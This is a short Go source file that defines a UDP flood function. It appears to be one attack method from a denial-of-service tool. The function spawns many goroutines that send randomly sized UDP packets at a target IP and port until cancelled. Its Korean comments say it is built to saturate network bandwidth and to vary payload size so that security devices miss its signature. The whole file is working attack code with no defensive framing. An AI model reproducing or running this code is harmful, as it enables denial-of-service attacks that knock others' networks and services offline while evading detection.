package methods

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"time"
)

// UdpFlood - 네트워크 대역폭을 완전히 채워버리는 고출력 엔진
func UdpFlood(ctx context.Context, IP, PORT string, SECONDS int) {
	fmt.Printf("[%s] UDP-BLAST Attack started: %s:%s\n", time.Now().Format("15:04:05"), IP, PORT)

	addr := net.JoinHostPort(IP, PORT)
	numWorkers := runtime.NumCPU() * 128
	
	// 미리 최적화된 거대 데이터 버퍼 준비
	payload := make([]byte, 1024) 
	rand.Read(payload)

	for i := 0; i < numWorkers; i++ {
		go func() {
			conn, err := net.Dial("udp", addr)
			if err != nil { return }
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					// 가변 페이로드로 보안 장비의 시그니처 탐지 무력화
					size := 512 + rand.Intn(512)
					conn.Write(payload[:size])
				}
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] UDP-BLAST Attack finished.\n", time.Now().Format("15:04:05"))
}
